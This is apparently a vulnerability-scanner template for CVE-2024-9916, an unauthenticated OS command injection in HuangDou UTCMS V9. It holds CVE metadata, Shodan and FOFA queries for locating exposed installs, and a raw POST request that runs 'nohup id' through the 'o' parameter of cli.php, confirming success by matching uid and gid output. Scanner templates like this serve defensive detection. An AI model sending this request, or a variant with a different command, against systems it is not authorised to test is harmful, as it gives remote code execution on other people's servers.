id: CVE-2024-9916

info:
  name: HuangDou UTCMS V9 - OS Command Injection
  author: iamnoooob,pdresearch
  severity: high
  description: |
    A vulnerability, which was classified as critical, has been found in HuangDou UTCMS V9. Affected by this issue is some unknown functionality of the file app/modules/ut-cac/admin/cli.php. The manipulation of the argument o leads to os command injection.The attack may be launched remotely. The exploit has been disclosed to the public and may be used.The vendor was contacted early about this disclosure but did not respond in any way.
  reference:
    - https://vuldb.com/?ctiid.280244
    - https://nvd.nist.gov/vuln/detail/CVE-2024-9916
    - https://vuldb.com/?id.280244
    - https://vuldb.com/?submit.418748
    - https://github.com/ARPSyndicate/cve-scores
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2024-9916
    cwe-id: CWE-78
    epss-score: 0.77269
    epss-percentile: 0.98911
    cpe: cpe:2.3:a:usualtool:usualtoolcms:9.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: usualtool
    product: usualtoolcms
    shodan-query: http.html:"usualtool"
    fofa-query: body="usualtool"
    runzero-match: service["http.body"] matches "(?i)usualtool"
  tags: cve,cve2024,huangdou,utc,rce,php,kev

http:
  - raw:
      - |
        POST /app/modules/ut-cac/admin/cli.php HTTP/1.1
        Host: {{Hostname}}
        Origin: {{RootURL}}
        Content-Type: application/x-www-form-urlencoded

        o=nohup id

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '~]#nohup id run complete.'
          - 'uid='
          - 'gid='
        condition: and

      - type: status
        status:
          - 200

